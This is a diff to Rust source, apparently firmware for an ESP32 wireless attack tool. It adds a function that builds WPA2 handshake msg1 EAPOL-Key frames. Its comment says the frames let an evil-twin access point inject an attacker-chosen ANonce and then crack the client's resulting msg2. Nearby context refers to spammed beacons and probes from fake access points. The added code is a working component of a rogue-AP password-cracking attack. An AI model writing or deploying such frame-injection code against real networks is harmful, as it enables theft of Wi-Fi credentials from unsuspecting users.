@@ -135,6 +135,49 @@ pub fn probe_req(buf: &mut [u8], src: [u8; 6], ssid: &[u8]) -> usize {
     c.n
 }
 
+/// Length of the msg1 EAPOL-Key frame [`eapol_m1`] builds.
+pub const EAPOL_M1_LEN: usize = 24 + 8 + 4 + 95;
+
+/// Build a WPA2 4-way **msg1** EAPOL-Key frame (AP -> client) carrying `anonce`
+/// and `replay`. This is a non-QoS EAPOL *data* frame — an ALLOWED `esp_wifi_80211_tx`
+/// subtype (unlike deauth) — so the evil twin can inject an ANonce WE choose and
+/// then crack the client's resulting msg2 (whose MIC is keyed to that ANonce).
+pub fn eapol_m1(buf: &mut [u8], client: [u8; 6], ap: [u8; 6], anonce: &[u8; 32], replay: u64) -> usize {
+    let mut c = Cur::new(buf);
+    // 802.11 data header (FromDS): a1 = client (DA), a2 = ap (BSSID/SA), a3 = ap
+    c.u8(0x08); // FC: type = data, subtype 0
+    c.u8(0x02); // FC flags: FromDS
+    c.u8(0x00);
+    c.u8(0x00); // duration
+    c.bytes(&client);
+    c.bytes(&ap);
+    c.bytes(&ap);
+    c.u8(0x00);
+    c.u8(0x00); // sequence control
+    // LLC/SNAP + EAPOL ethertype
+    c.bytes(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);
+    // 802.1X header: version 2, type 3 (EAPOL-Key), body length 95 (no key data)
+    c.u8(0x02);
+    c.u8(0x03);
+    c.u8(0x00);
+    c.u8(95);
+    // EAPOL-Key body (msg1: Pairwise + ACK, NO MIC). key info 0x008A = ver2|pairwise|ack.
+    c.u8(0x02); // descriptor type RSN
+    c.u8(0x00);
+    c.u8(0x8a);
+    c.u8(0x00);
+    c.u8(0x10); // key length 16
+    c.bytes(&replay.to_be_bytes()); // replay counter (8)
+    c.bytes(anonce); // key nonce (32) = ANonce
+    c.bytes(&[0u8; 16]); // key IV
+    c.bytes(&[0u8; 8]); // key RSC
+    c.bytes(&[0u8; 8]); // reserved
+    c.bytes(&[0u8; 16]); // key MIC (none in msg1)
+    c.u8(0x00);
+    c.u8(0x00); // key data length 0
+    c.n
+}
+
 /// Derive a locally-administered, unicast random-ish MAC from a 32-bit seed.
 /// (LAA bit set, multicast bit cleared.) Used as the source address for spammed
 /// beacons / probes so each fake AP looks like a distinct device.
